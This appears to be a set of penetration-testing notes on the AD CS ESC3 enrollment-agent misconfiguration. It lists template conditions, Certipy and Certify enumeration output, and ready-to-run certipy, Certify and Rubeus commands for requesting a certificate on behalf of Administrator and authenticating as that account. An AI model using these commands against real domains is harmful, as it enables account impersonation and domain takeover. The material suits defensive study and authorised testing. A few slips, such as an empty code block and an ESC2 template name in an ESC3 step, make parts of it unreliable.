## Overview
Its same as `ESC2` but the difference is ESC2 has `AnyPurpos` EKU which mean it has has implicitly the OID of Enrollment Agent EKU. So ESC3 has less EKU but has the same attack path as ESC2.

`Condition 1` - Involves a template that grants low-privileged users the ability to obtain an `enrollment agent certificate`. This condition is characterized by several specific details, which are consistent with those outlined in `ESC1`:

1. The Enterprise CA grants low-privileged users enrollment rights.
2. Manager approval should be turned off.
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template includes the `Certificate Request Agent EKU`, specifically the Certificate Request Agent OID (`1.3.6.1.4.1.311.20.2.1`), allowing the requesting of other certificate templates on behalf of other principals.
6. Another template that permits low-privileged users to use the enrollment agent certificate to request certificates on behalf of other users. Additionally, this template defines an `Extended Key Usage` that allows for domain authentication. The conditions are as follows:
	1. The Enterprise CA grants low-privileged users enrollment rights.
	2. Manager approval should be turned off.
	3. The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
	4. The certificate template defines an EKU that enables domain authentication.
	5. No restrictions on enrollment agents are implemented at the CA level.
---
## Enumeration
### Linux
#### Certipy
```
Enrollment Agent                    : True
...
Extended Key Usage                  : Certificate Request Agent
```

### Windows
#### Certify
```powershell
pkiextendedkeyusage                   : Certificate Request Agent
mspki-certificate-application-policy  : Certificate Request Agent
```
#### powershell
```

```
---
## Abuse
1. The attacker enrolls for a certificate that has Enrollment agent. This certificate can now act as an Enrollment Agent certificate.
2. The attacker uses this newly acquired  certificate to request a _new_ certificate on behalf of a privileged user (e.g., Administrator). This second request targets a standard template like "User" or "Machine" that allows enrollment by enrollment agents and for which the target user has enrollment rights.
3. The attacker uses the "on-behalf-of" certificate to authenticate as the privileged user.
### Linux
```sh
# 1. Request the any key usage certificate
certipy req -u "$USER" -p "$PASSWORD" -dc-ip "$IP" -target "$CA"."$DOMAIN" -ca "$CA" -template 'EnrollmentAgentTemplate'

# 2. Use the certificate to ask for authentication certificate on behalf of other user.
certipy req -u "$USER" -p "$PASSWORD" -dc-ip "$IP" -target "$CA"."$DOMAIN" -ca "$CA" -template 'User'  -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'

# 3. Authenticate
certipy auth -pfx 'administrator.pfx' -dc-ip "$IP"
```

### Windows
```powershell
# 1. Request certificate that has enrollment agent "which will enable us to request other users certificates"
.\Certify.exe request --ca LAB-DC\lab-LAB-DC-CA --template ESC2

# 2. Request certificate in behalf of other user using the already granted certificate
.\Certify.exe request-agent --ca LAB-DC\lab-LAB-DC-CA --target administrator --agent-pfx $base64Certificate --template user
# or using the old certify
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /onbehalfof:LAB\Administrator /enrollcert:cert.pfx # pfx should be from openssl.

# 3. Use the certificate.
.\Rubeus.exe asktgt /user:lab\Administrator /certificate:admin.pfx /getcredentials
```